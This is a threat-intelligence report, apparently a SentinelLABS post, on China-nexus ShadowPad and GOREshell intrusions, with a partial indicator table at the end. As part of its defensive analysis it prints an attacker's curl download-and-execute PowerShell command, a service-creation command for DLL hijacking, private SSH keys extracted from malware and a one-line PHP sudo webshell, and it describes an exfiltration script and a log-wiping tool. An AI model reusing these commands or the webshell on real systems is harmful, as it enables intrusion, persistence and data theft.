<p>The threat actor leveraged ORB network infrastructure, which we assess to be operated from China, and exploited the <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8963" target="_blank" rel="noopener noreferrer">CVE-2024-8963</a> vulnerability together with <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8190" target="_blank" rel="noopener noreferrer">CVE-2024-8190</a> to establish an initial foothold, a few days before the vulnerabilities were publicly disclosed. This intrusion method suggests the involvement of UNC5174, which is <a href="https://cloud.google.com/blog/topics/threat-intelligence/initial-access-brokers-exploit-f5-screenconnect" target="_blank" rel="noopener noreferrer">assessed</a> to be a contractor for China&#8217;s Ministry of State Security (MSS) primarily focusing on gaining access and specializing in exploiting vulnerabilities in targeted systems. After compromising these systems, UNC5174 is suspected of transferring access to other threat actors.</p>
<p>In January 2025, CISA and the FBI released a <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-022a" target="_blank" rel="noopener noreferrer">joint advisory</a> reporting threat actor activities that also took place in September 2024, involving the chained exploitation of CVE-2024-8963 and CVE-2024-8190, without providing specific attribution assessments. In March 2025, the French Cybersecurity Agency (ANSSI) released its <a href="https://cyber.gouv.fr/en/publications/cyber-threat-overview-2024" target="_blank" rel="noopener noreferrer">2024 cyber threat overview</a> report, which documents intrusions that occurred in September 2024, involved the same vulnerabilities, and show overlaps in TTPs associated with UNC5174.</p>
<p>Additionally, Mandiant has <a href="https://cloud.google.com/blog/topics/threat-intelligence/initial-access-brokers-exploit-f5-screenconnect" target="_blank" rel="noopener noreferrer">observed</a> UNC5174 exploiting the <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46747" target="_blank" rel="noopener noreferrer">CVE-2023-46747</a> and <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1709" target="_blank" rel="noopener noreferrer">CVE-2024-1709</a> vulnerabilities and deploying a publicly available backdoor tracked as GOREVERSE. Strings and code segments in the public GOREVERSE YARA rule provided by Mandiant match the <code>reverse_ssh</code> backdoor, placing GOREVERSE in the GOREshell malware cluster, samples of which we observed in both this intrusion and the October 2024 activity targeting the South Asian government entity.</p>
<p>We collectively track Activity D, E and F as the PurpleHaze threat cluster. While we attribute PurpleHaze with high confidence to China-nexus threat actors, investigations continue to determine the specific threat groups behind the activities and their potential links to the June 2024 and later ShadowPad intrusions (Activity A, B, and C).</p>
<p>We do not rule out the involvement of distinct threat groups or the possibility of multiple intrusions conducted by the same threat actor, especially given the widespread use of publicly available tools and the extensive sharing of malware, infrastructure, and operational practices among Chinese threat groups. We also consider the possibility that access may have been transferred between different actors, particularly in light of the suspected involvement of UNC5174.</p>
<h2>Technical Details | ShadowPad Intrusions</h2>
<p>We present below technical details on the ShadowPad intrusion into the South Asian government entity in June 2024 (Activity A), as well as on the broader ShadowPad activities that took place between July 2024 and March 2025 (Activity B and C).</p>
<h3>Activity A | ShadowPad and ScatterBrain Obfuscation</h3>
<p>This intrusion involved the deployment of a ShadowPad sample named <code>AppSov.exe</code>. The threat actor deployed <code>AppSov.exe</code> by executing a PowerShell command that performs the following actions:</p>
<ul>
<li aria-level="1">Downloads a file named <code>x.dat</code> from a remote endpoint using <code>curl.exe</code> after a 60-second delay.</li>
<li aria-level="1">Saves the downloaded file as <code>AppSov.exe</code> in the <code>C:\ProgramData\</code> directory.</li>
<li aria-level="1">Launches the executable using the <code>Start-Process</code> PowerShell command.</li>
<li aria-level="1">Reboots the system after a delay of 30 minutes.</li>
</ul>
<pre>
sleep 60;curl.exe -o c:\programdata\AppSov.EXE http://[REDACTED]/dompdf/x.dat;start-process c:\programdata\AppSov.EXE;sleep 1800;shutdown.exe -r -t 1 -f;
</pre>
<p>The endpoint hosting <code>x.dat</code> was a previously compromised system within the same organization. Our analysis revealed that malware artifacts had been deployed on this system approximately one month prior to the ShadowPad deployment. These include the agent component of the <a href="https://github.com/itaymigdal/Nimbo-C2" target="_blank" rel="noopener noreferrer">Nimbo-C2</a> open-source remote access framework, as well as a PowerShell script that performs the following actions:</p>
<ul>
<li aria-level="1">Collects sensitive user data (documents, credentials, and cryptographic material) by recursively searching <code>C:\Users\</code> for files modified in the previous 600 days and with the following extensions: <code>*.xls</code>, <code>*.xlsx</code>, <code>*.ods</code>, <code>*.txt</code>, <code>*.pem</code>, <code>*.cert</code>, and <code>*.pfx</code>.</li>
<li aria-level="1">Copies the collected files to a temporary folder at <code>C:\windows\vss\temp</code>.</li>
<li aria-level="1">Archives the collected files into an archive file named with the system’s MAC address and date, likely for tracking compromised endpoints.</li>
<li aria-level="1">Encrypts and password-protects the archive using <a href="https://www.7-zip.org/" target="_blank" rel="noopener noreferrer">7-Zip</a> with the password <code>@WsxCFt6&amp;UJMmko0</code>, ensuring the data is obfuscated from inspection.</li>
<li aria-level="1">Exfiltrates the encrypted archive via a <code>curl</code> POST request to a hardcoded URL: <code>https[://]45.13.199[.]209/rss/rss.php</code>.</li>
<li aria-level="1">Removes traces by deleting the temporary folder, archive, and DAT files after exfiltration to avoid detection and forensic recovery.</li>
</ul>
<figure id="attachment_123747" aria-describedby="caption-attachment-123747" style="width: 778px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_14.jpg" alt="PowerShell exfiltration script" width="778" height="318" class="size-full wp-image-123747" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_14.jpg 778w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_14-300x123.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_14-768x314.jpg 768w" sizes="auto, (max-width: 778px) 100vw, 778px" /><figcaption id="caption-attachment-123747" class="wp-caption-text">PowerShell exfiltration script</figcaption></figure>
<p>The Nimbo-C2 agent was deployed to <code>C:\ProgramData\Prefetch\PfSvc.exe</code>, likely masquerading as a Privacyware Privatefirewall executable.</p>
<p>We have not previously observed the use of Nimbo-C2 or variants of the PowerShell exfiltration script in the context of suspected Chinese APT activity. <a href="https://medium.com/@knownsec404team/apt-k-47-organization-launches-espionage-attacks-using-a-new-trojan-tool-5e7eccfdce2f" target="_blank" rel="noopener noreferrer">Previous research</a> has documented the use of Nimbo-C2 in operations attributed to APT-K-47 (also known as Mysterious Elephant), a threat actor believed to originate from South Asia.</p>
<p>The deployment of the ShadowPad sample <code>AppSov.exe</code> raises several possibilities:</p>
<ul>
<li aria-level="1">the same threat actor conducted both the earlier activity and the ShadowPad deployment,</li>
<li aria-level="1">access was handed off to, or leveraged by, a second actor, or</li>
<li aria-level="1">two distinct actors operated independently within the same environment.</li>
</ul>
<p><code>AppSov.exe</code> was obfuscated using a variant of ScatterBrain. The malware uses the domain <code>news.imaginerjp[.]com</code> and the IP address <code>65.38.120[.]110</code> for C2 communication, leveraging DNS over HTTPS (DoH) in an attempt to evade detection by Base-64 encoding queried domains and obscuring DNS traffic from monitoring systems.</p>
<pre>
https[://]8.8.8.8//dns-query?dns=AAABAAABAAAAAAAABG5ld3MKaW1hZ2luZXJqcANjb20AAAEAAQ
</pre>
<p><code>AppSov.exe</code> is obfuscated using dispatcher routines that alter control flow, displacements placed after each invocation of these routines, and opaque predicates. The malware verifies its integrity using the constant values <code>0x89D17427</code>, <code>0x254733D6</code>, <code>0x6FE2CF4E</code>, and <code>0x110302D6</code>. It is distributed with three modules: one with the ID <code>0x0A</code> and two with the ID <code>0x20</code>. The ShadowPad module IDs designate different types of modules, including configuration data or code that implements malware functionalities such as injection or data theft.</p>
<p><figure id="attachment_123819" aria-describedby="caption-attachment-123819" style="width: 628px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_4x.jpg" alt="AppSov.exe: ShadowPad module IDs and sizes" width="628" height="502" class="size-full wp-image-123819" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_4x.jpg 628w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_4x-300x240.jpg 300w" sizes="auto, (max-width: 628px) 100vw, 628px" /><figcaption id="caption-attachment-123819" class="wp-caption-text"><em>AppSov.exe</em>: ShadowPad module IDs and sizes</figcaption></figure><br />
<figure id="attachment_123820" aria-describedby="caption-attachment-123820" style="width: 616px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_7x.jpg" alt="AppSov.exe: Deobfuscated dispatcher routine" width="616" height="346" class="size-full wp-image-123820" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_7x.jpg 616w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_7x-300x169.jpg 300w" sizes="auto, (max-width: 616px) 100vw, 616px" /><figcaption id="caption-attachment-123820" class="wp-caption-text"><em>AppSov.exe</em>: Deobfuscated dispatcher routine</figcaption></figure></p>
<p>For a detailed overview of the ScatterBrain obfuscation mechanism and additional ShadowPad implementation details, we refer to <a href="https://cloud.google.com/blog/topics/threat-intelligence/scatterbrain-unmasking-poisonplug-obfuscator" target="_blank" rel="noopener noreferrer">previous research</a> by Google Threat Intelligence Group.</p>
<h3>Activity B &amp; C | A Global ShadowPad Operation</h3>
<p>Based on various implementation overlaps with <code>AppSov.exe</code>, including configuration data as well as custom decryption and integrity verification constant values, we identified multiple additional ShadowPad samples obfuscated using ScatterBee variants. This also led to the discovery of related infrastructure, including the ShadowPad C2 servers <code>dscriy.chtq[.]net</code> and <code>updata.dsqurey[.]com</code>, as well as the suspected ShadowPad-related domains <code>network.oossafe[.]com</code> and <code>notes.oossafe[.]com</code>.</p>
<p><figure id="attachment_123746" aria-describedby="caption-attachment-123746" style="width: 507px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_2.jpg" alt="Deobfuscated integrity verification routine in AppSov.exe" width="507" height="260" class="size-full wp-image-123746" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_2.jpg 507w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_2-300x154.jpg 300w" sizes="auto, (max-width: 507px) 100vw, 507px" /><figcaption id="caption-attachment-123746" class="wp-caption-text">Deobfuscated integrity verification routine in <em>AppSov.exe</em></figcaption></figure><br />
<figure id="attachment_123745" aria-describedby="caption-attachment-123745" style="width: 604px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_3.jpg" alt="Deobfuscated integrity verification routine in another ShadowPad sample" width="604" height="335" class="size-full wp-image-123745" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_3.jpg 604w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_3-300x166.jpg 300w" sizes="auto, (max-width: 604px) 100vw, 604px" /><figcaption id="caption-attachment-123745" class="wp-caption-text">Deobfuscated integrity verification routine in another ShadowPad sample</figcaption></figure></p>
<p>Some of the samples we identified differ in execution from <code>AppSov.exe</code>. Instead of embedding the full ShadowPad functionality and configuration within a single executable, they are implemented as Windows DLLs designed to be loaded by specific legitimate executables vulnerable to DLL hijacking. These DLLs then load an external file with an eight-character name and the <code>.tmp</code> extension, for example <code>1D017DF2.tmp</code>.</p>
<p>Using C2 netflow and SentinelOne telemetry data, we identified a broad range of victim organizations compromised by the ShadowPad samples we discovered. Between July 2024 and March 2025, this malware was involved in intrusions at over 70 organizations across multiple regions globally, spanning sectors such as manufacturing, government, finance, telecommunications, and research. Among the victims was the IT services and logistics company that was managing hardware logistics for SentinelOne employees at the time (Activity C).</p>
<figure id="attachment_123742" aria-describedby="caption-attachment-123742" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_6.jpg" alt="Geographical distribution of victims" width="1999" height="1278" class="size-full wp-image-123742" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_6.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_6-300x192.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_6-1024x655.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_6-768x491.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_6-1536x982.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-123742" class="wp-caption-text">Geographical distribution of victims</figcaption></figure>
<p>We suspect that the most common initial access vector involved the exploitation of Check Point gateway devices, consistent with <a href="https://www.orangecyberdefense.com/global/blog/cert-news/meet-nailaolocker-a-ransomware-distributed-in-europe-by-shadowpad-and-plugx-backdoors" target="_blank" rel="noopener noreferrer">previous research</a> on this topic. We also observed communication to ShadowPad C2 servers originating from Fortinet Fortigate, Microsoft IIS, SonicWall, and CrushFTP servers, suggesting potential exploitation of these systems as well.</p>
<h2>Technical Details | PurpleHaze</h2>
<p>We present below technical details on intrusions that are part of the PurpleHaze threat cluster: the intrusion into the South Asian government entity in October 2024 (Activity D, the same organization compromised using ShadowPad in June 2024), the reconnaissance of SentinelOne infrastructure in October 2024 (Activity E), and the intrusion into the European media organization in September 2024 (Activity F).</p>
<h3>Activity D | GOREshell &amp; a China-based ORB Network</h3>
<p>In early October 2024, we detected system reconnaissance and malware deployment activities on a workstation within the South Asian government entity. The threat actor executed the <code>ipconfig</code> Windows command to query network configuration and established a connection to IP address <code>103.248.61[.]36</code> on port 443. The adversary then created the <code>C:\Program Files\VMware\VGAuth</code> directory and downloaded an archive file named <code>VGAuth1.zip</code> from <code>103.248.61[.]36</code>; after extracting its contents into the <code>VGAuth</code> directory, the archive was deleted.</p>
<p>The archive file contained two executables: a legitimate <code>VGAuthService.exe</code> executable and a malicious DLL file named <code>glib-2.0.dll</code> (original filename: <code>libglib-2.0-0.dll</code>), which masquerades as a legitimate <a href="https://docs.gtk.org/glib/" target="_blank" rel="noopener noreferrer">GLib–2.0</a> library file.</p>
<p><code>VGAuthService.exe</code> implements the VMware Guest Authentication Service. The threat actor deployed version <code>11.3.5.59284</code>, signed by VMWare and compiled on Tuesday, August 31, 2021, 06:14:07 UTC. This version is vulnerable to DLL hijacking.</p>
<p>The threat actor then created a new Windows service named <code>VGAuthService</code>, which automatically starts upon system boot, runs the <code>VGAuthService.exe</code> executable, and displays as <code>Alias Manager and Ticket Service</code>. When the service was started, <code>VGAuthService.exe</code> loaded and executed the malicious <code>glib-2.0.dll</code> library file.</p>
<pre>
sc create VGAuthService binPath= "\"C:\\Program Files\\VMware\\\VGAuth\\VGAuthService.exe\"" start=auto error=ignore displayname="Alias Manager and Ticket Service"
</pre>
<p><code>glib-2.0.dll</code> implements the GOREshell backdoor, which uses <code>reverse_ssh</code> functionalities to establish SSH connections to attacker-controlled endpoints. The backdoor is implemented in the Go programming language and obfuscated using <a href="https://github.com/burrowers/garble" target="_blank" rel="noopener noreferrer">Garble</a>, including string literals, package paths, and function names. It uses the <a href="https://pkg.go.dev/cmd/cgo" target="_blank" rel="noopener noreferrer">cgo</a> library to invoke C code.</p>
<figure id="attachment_123750" aria-describedby="caption-attachment-123750" style="width: 437px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_11.jpg" alt="glib-2.0.dll: Obfuscated form of the string Fail to detect service: %v" width="437" height="214" class="size-full wp-image-123750" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_11.jpg 437w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_11-300x147.jpg 300w" sizes="auto, (max-width: 437px) 100vw, 437px" /><figcaption id="caption-attachment-123750" class="wp-caption-text"><em>glib-2.0.dll</em>: Obfuscated form of the string <em>Fail to detect service: %v</em></figcaption></figure>
<p><code>glib-2.0.dll</code> contains a private SSH key used for establishing SSH connections to the threat actor’s C2 server.</p>
<pre>
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWQyNTUxOQAAACABqioIxWKMLg7cKJuRt30HFKJuyTBVP7F6c6G7ozrcdwAAAIgRVxQaEVcUGgAAAAtzc2gtZWQyNTUxOQAAACABqioIxWKMLg7cKJuRt30HFKJuyTBVP7F6c6G7ozrcdwAAAECLzCu1ax/sxC6Vvt8/pkE+H2ryf9RtRqsyjs/1cL5k3QGqKgjFYowuDtwom5G3fQcUom7JMFU/sXpzobujOtx3AAAAAAECAwQF
-----END OPENSSH PRIVATE KEY-----
</pre>
<p>The malware was configured to use <code>downloads.trendav[.]vip</code> for C2 purposes. This domain resolved to <code>142.93.214[.]219</code> at the time of the activity. <code>glib-2.0.dll</code> establishes SSH connections over the Websocket protocol (<code>wss[://]downloads.trendav[.]vip:443</code>).</p>
<figure id="attachment_123752" aria-describedby="caption-attachment-123752" style="width: 488px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_1.jpg" alt="Network request issued by glib-2.0.dll" width="488" height="176" class="size-full wp-image-123752" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_1.jpg 488w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_1-300x108.jpg 300w" sizes="auto, (max-width: 488px) 100vw, 488px" /><figcaption id="caption-attachment-123752" class="wp-caption-text">Network request issued by <em>glib-2.0.dll</em></figcaption></figure>
<p>The threat actor deployed GOREshell variants not only on Windows systems but also on Linux. This includes two samples: one masquerading as the <code>snapd</code> Linux service and the other as the <code>update-notifier</code> service. The threat actor deployed both samples as Linux services, which included creating service configuration files, such as <code>/usr/lib/systemd/system/update-notifier.service</code>.</p>
<figure id="attachment_123749" aria-describedby="caption-attachment-123749" style="width: 590px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_12.jpg" alt="The content of update-notifier.service" width="590" height="311" class="size-full wp-image-123749" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_12.jpg 590w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_12-300x158.jpg 300w" sizes="auto, (max-width: 590px) 100vw, 590px" /><figcaption id="caption-attachment-123749" class="wp-caption-text">The content of <em>update-notifier.service</em></figcaption></figure>
<p>In contrast to <code>update-notifier</code>, which is obfuscated using Garble and packed with UPX, <code>snapd</code> is not obfuscated. Both samples use <code>epp.navy[.]ddns[.]info</code> as their C2 servers and are configured to proxy connections through a local IP address over port 8080. Additionally, both samples store the same private SSH key as <code>glib-2.0.dll</code>.</p>
<p>Based on the private key stored in <code>glib-2.0.dll</code>, <code>snapd</code>, and <code>update-notifier</code>, we discovered an additional GOREshell variant, which was uploaded on a malware sharing platform in September 2023. This GOREshell variant is implemented as a <code>tapisrv.dll</code> library file (Microsoft Windows Telephony Server) and loaded as a Windows service by the <code>svchost.exe</code> service container process. The malware uses the <code>mail.ccna[.]organiccrap[.]com</code> domain for C2 purposes.</p>
<p>The discovery of the <code>tapisrv.dll</code> sample indicates reuse of the private key in intrusions separated by a considerable period.</p>
<figure id="attachment_123740" aria-describedby="caption-attachment-123740" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_9.jpg" alt="Private key reuse" width="1999" height="1150" class="size-full wp-image-123740" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_9.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_9-300x173.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_9-1024x589.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_9-768x442.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_9-1536x884.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-123740" class="wp-caption-text">Private key reuse</figcaption></figure>
<p>We associate some of the GOREshell C2 infrastructure with an ORB network, which we track as being operated from China and actively used by several suspected Chinese cyberespionage actors, including overlaps with APT15.</p>
<p>The threat actor made significant efforts to obscure their activity and remove evidence of their presence, including timestomping GOREshell executable files and deploying a log removal tool on Linux systems, specifically at the <code>/usr/sbin/mcl</code> filepath.</p>
<p>Our analysis of <code>mcl</code> suggests that the executable is likely a compiled and modified version of the source code of a tool called <code>clear13</code>, developed by members of The Hacker&#8217;s Choice community. The source code of <code>clear13</code> is <a href="https://github.com/hackerschoice/THC-Archive/tree/master/Tools" target="_blank" rel="noopener noreferrer">publicly available</a> on GitHub.</p>
<p>The <code>mcl</code> executable is packed using a custom-modified version of UPX. The tool supports four commands, which are presented to the user through a help menu.</p>
<div style="overflow-x:auto;">
<table style="border-collapse: collapse; width: 100%; height: 120px;">
<tbody>
<tr style="height: 24px;">
<td style="width: 25.0%; height: 24px;"><strong>Command</strong></td>
<td style="width: 25.0%; height: 24px;"><strong>Displayed help text</strong></td>
<td style="width: 50.0%; height: 24px;"><strong>Description</strong></td>
</tr>
<tr style="height: 24px;">
<td style="width: 25.0%; height: 24px;">sudo</td>
<td style="width: 25.0%; height: 24px;">sudo cmd</td>
<td style="width: 50.0%; height: 24px;">Executes a specified command (<code>cmd</code>) with elevated privileges using <code>sudo</code>.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 25.0%; height: 24px;">clear</td>
<td style="width: 25.0%; height: 24px;">clear name</td>
<td style="width: 50.0%; height: 24px;">Removes the last entry containing a specified username (<code>name</code>) from <code>/var/log/wtmp</code>, <code>/var/run/utmp</code>, and <code>/var/log/lastlog</code>.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 25.0%; height: 24px;">secure</td>
<td style="width: 25.0%; height: 24px;">secure timeString</td>
<td style="width: 50.0%; height: 24px;">Removes all entries matching a specified pattern (<code>timeString</code>) from <code>/var/log/secure</code>.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 25.0%; height: 24px;">history</td>
<td style="width: 25.0%; height: 24px;">history leftNum</td>
<td style="width: 50.0%; height: 24px;">Truncates the user command history, keeping only a specified number of entries (<code>leftNum</code>).</td>
</tr>
</tbody>
</table>
</div>
<h3>Activity E | Probing &amp; Reconnaissance of SentinelOne Infrastructure</h3>
<p>In October 2024, SentinelLABS observed consistent attempts to establish remote connections to multiple Internet-facing SentinelOne servers over port 443 for reconnaissance purposes.</p>
<p>Our analysis of the infrastructure associated with this activity revealed links to the October 2024 intrusion into the South Asian government entity (Activity D).</p>
<p>We identified server characteristics and domain registration patterns suggesting coordinated infrastructure management and bulk domain registration, likely carried out by the same threat actor conducting reconnaissance on SentinelOne infrastructure and involved in Activity D, or by a third-party entity responsible for managing the infrastructure used in both activities.</p>
<p>The connections we initially observed originated from a virtual private server (VPS) that used a C2 server as a proxy. At the time of the activity, the server had an IP address of <code>128.199.124[.]136</code>, which was mapped to the domain name <code>tatacom.duckdns[.]org</code> and is designed to appear as part of a major South Asian telecommunications provider’s infrastructure.</p>
<p>Based on a unique server fingerprint, SentinelLABS discovered an extensive collection of related network infrastructure.</p>
<figure id="attachment_123748" aria-describedby="caption-attachment-123748" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_13.jpg" alt="Infrastructure overview" width="1999" height="1567" class="size-full wp-image-123748" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_13.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_13-300x235.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_13-1024x803.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_13-768x602.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_13-1536x1204.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-123748" class="wp-caption-text">Infrastructure overview</figcaption></figure>
<p>The C2 domain <code>downloads.trendav[.]vip</code>, observed in Activity D, resolved to the IP address <code>142.93.214[.]219</code>. We also identified this IP address based on the server fingerprint. Furthermore, the IP address of a server associated with the same fingerprint, <code>143.244.137[.]54</code>, was mapped to the domain name <code>cloud.trendav[.]co</code> in October 2024. This domain name overlaps with <code>downloads.trendav[.]vip</code>.</p>
<p>Additionally, historical domain registration records show that the root domain <code>trendav[.]vip</code> was originally registered through Dynadot Inc., on 24 October 2023, at 13:05:29 UTC. Identifying all domains registered through the same registrar at the exact same date and time (to the second) reveals the domains <code>secmailbox[.]us</code> and <code>sentinelxdr[.]us</code>, the latter of which likely masquerades as SentinelOne infrastructure.</p>
<p>Between February and April 2025, the <code>sentinelxdr[.]us</code> domain resolved to <code>142.93.214[.]219</code>, the same IP address that <code>downloads.trendav[.]vip</code> resolved to in October 2024.</p>
<p>In October 2024, <code>mail.secmailbox[.]us</code> resolved to <code>142.93.212[.]42</code>. Like the server at IP address <code>142.93.214[.]219</code> (<code>downloads.trendav[.]vip/sentinelxdr[.]us</code>), this server shared the same server fingerprint.</p>
<p>Furthermore, domain registration data for <code>sentinelxdr[.]us</code> was updated on 25 September 2024, at 01:43:46 UTC, a date and time that is identical to an update of the registration data of <code>trendav[.]vip</code>.</p>
<h3>Activity F | The Return of dsniff</h3>
<p>The late September 2024 intrusion into the European media organization showed overlaps in tooling with the October 2024 intrusion into the South Asian government entity (Activity D). These overlaps include the use of the GOREshell backdoor and publicly available tools developed by The Hacker’s Choice community.</p>
<p>The threat actor deployed a UPX-packed GOREshell sample, which was configured to use <code>107.173.111[.]26</code> over the WebSocket protocol for C2 communication (<code>wss[://]107.173.111[.]26:443</code>). The executable file we retrieved contains a private SSH key and the public SSH key fingerprint <code>f0746e78e49896dfa01c674bf2a800443b1966c54663db5c679bc86533352590</code>.</p>
<pre>
-----BEGIN PRIVATE KEY-----
MC4CAQAwBQYDK2VwBCIEIMsHXDEWgXiPFrIjDOSXZqReC2HHiS6kgoZT0YgHlK87
-----END PRIVATE KEY-----
</pre>
<p>Based on the fingerprint, we identified a Garble-obfuscated GOREshell sample that was uploaded to a malware sharing platform from Iran in late July 2024. This GOREshell sample also contains a private SSH key and is configured to use the same C2 server, <code>107.173.111[.]26</code>, over the TLS protocol (<code>tls[://]107.173.111[.]26:80</code>).</p>
<p>This suggests threat actor activity since at least July 2024, possibly targeting organizations in both Europe and the Middle East.</p>
<pre>
-----BEGIN PRIVATE KEY-----
MC4CAQAwBQYDK2VwBCIEINArpOAwJO2+lv9Da+PzmkbKxGhMcapQ+/NhUq4nifvh
-----END PRIVATE KEY-----
</pre>
<p>The threat actor also deployed version 2.5a1 of <a href="https://www.monkey.org/~dugsong/dsniff/" target="_blank" rel="noopener noreferrer">dsniff</a>, a collection of tools for network auditing and penetration testing. With active development of <code>dsniff</code> having been discontinued for over 15 years, our investigation of public source code repositories revealed that the THC community has <a href="https://github.com/hackerschoice/dsniff" target="_blank" rel="noopener noreferrer">released version 2.5a1</a> in an effort to resume active maintenance of the project.</p>
<p>To obfuscate their presence, the threat actor timestomped deployed executables, setting their creation date to September 15, 2021. After gaining initial access to the environment, the perpetrators deployed a simple PHP webshell that enables remote command execution by passing commands via the <code>a</code> parameter and executing them with elevated privileges using <code>sudo</code>.</p>
<pre>
&lt;?php system('/bin/sudo '. @$_REQUEST['a']);?>
</pre>
<p>Our investigation of system and network traffic artifacts strongly suggests that the threat actor gained an initial foothold by exploiting <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8963" target="_blank" rel="noopener noreferrer">CVE-2024-8963</a> in conjunction with <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8190" target="_blank" rel="noopener noreferrer">CVE-2024-8190</a> (both Ivanti Cloud Services Appliance vulnerabilities) on September 5, 2024, a few days before their public disclosure.</p>
<p>We track some of the malicious infrastructure used in this attack as part of an ORB network, which we suspect is operated from China and includes compromised network edge devices.</p>
<h2>Conclusions</h2>
<p>This post highlights the persistent threat posed by China-nexus cyberespionage actors to a wide range of industries and public sector organizations, including cybersecurity vendors themselves. The activities detailed in this research reflect the strong interest these actors have in the very organizations tasked with defending digital infrastructure.</p>
<p>Our findings underscore the critical need for constant vigilance, robust monitoring, and rapid response capabilities. By publicly sharing details of our investigations, we aim to provide insight into the rarely discussed targeting of cybersecurity vendors, helping to destigmatize sharing of IOCs related to these campaigns, and thus contribute to a deeper understanding of the tactics, objectives, and operational patterns of China-nexus threat actors. As these adversaries continue to adapt to our response efforts, it’s essential that defenders prioritize transparency, intelligence sharing, and coordinated action over the fear of reputational harm.</p>
<p>We encourage others in the industry to adopt a proactive approach to threat intelligence sharing and defense coordination, recognizing that collective security strengthens the entire community.</p>
<p>We are grateful to our partners at Lumen Technologies Black Lotus Labs for their collaboration and support.</p>
<h2>Indicators of Compromise</h2>
<h3>SHA-1 Hashes</h3>
<div style="overflow-x:auto;">
<table style="border-collapse: collapse; width: 100%; height: 120px;">
<tbody>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;"><strong>Value</strong></td>
<td style="width: 35.0%; height: 24px;"><strong>Note</strong></td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">106248206f1c995a76058999ccd6a6d0f420461e</td>
<td style="width: 35.0%; height: 24px;">Webshell</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">411180c89953ab5e0c59bd4b835eef740b550823</td>
<td style="width: 35.0%; height: 24px;">GOREshell (snapd)</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">4896cfff334f846079174d3ea2d541eec72690a0</td>
